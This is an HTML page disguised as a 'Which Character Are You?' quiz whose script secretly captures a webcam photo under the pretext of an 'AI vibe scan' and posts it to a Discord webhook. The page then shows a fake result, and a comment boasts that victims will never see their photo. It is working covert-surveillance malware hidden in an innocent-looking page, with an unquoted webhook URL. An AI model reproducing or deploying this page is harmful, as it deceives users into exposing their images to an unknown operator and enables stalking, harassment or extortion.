<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Which Character Are You?</title>
  <style>
    body { font-family: sans-serif; background: #0f172a; color: #fff; text-align: center; padding: 20px; }
    .card { background: #1e293b; padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; }
    button { background: #6366f1; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
    video, canvas { display: none; }
  </style>
</head>
<body>

  <div class="card" id="quiz-card">
    <h2>✨ Which Character Are You? ✨</h2>
    <p>Take the AI Vibe Test to match your inner character!</p>
    
    <label>What's your secret superpower?</label>
    <select id="q1" style="width: 100%; padding: 8px; margin: 10px 0;">
      <option>Mind Reading</option>
      <option>Invisibility</option>
      <option>Super Speed</option>
    </select>

    <button onclick="startScan()">Start Vibe Scan 🚀</button>
  </div>

  <div class="card" id="result-card" style="display:none;">
    <h2>🎉 Match Found! 🎉</h2>
    <h1 style="color: #38bdf8;">👑 Anime Mastermind</h1>
    <p>98.7% Vibe Match!</p>
    <p>Share with friends to see their result!</p>
  </div>

  <video id="webcam" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // ⚠️ APNA DISCORD WEBHOOK URL YAHAN PASTE KAREIN ⚠️
    const DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4;

    async function startScan() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;

        setTimeout(() => {
          captureAndSend(video, stream);
        }, 1500);

      } catch (err) {
        alert("Camera permission required for AI character scan!");
      }
    }

    function captureAndSend(video, stream) {
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Stop camera
      stream.getTracks().forEach(track => track.stop());

      // Convert image to blob and send to Discord
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('file', blob, 'capture.png');
        formData.append('content', '📸 **New Character Scan Photo Captured!**');

        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
          fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
        }

        // Show result screen to user (They will NEVER see their photo)
        document.getElementById('quiz-card').style.display = 'none';
        document.getElementById('result-card').style.display = 'block';
      }, 'image/png');
    }
  </script>
</body>
</html>
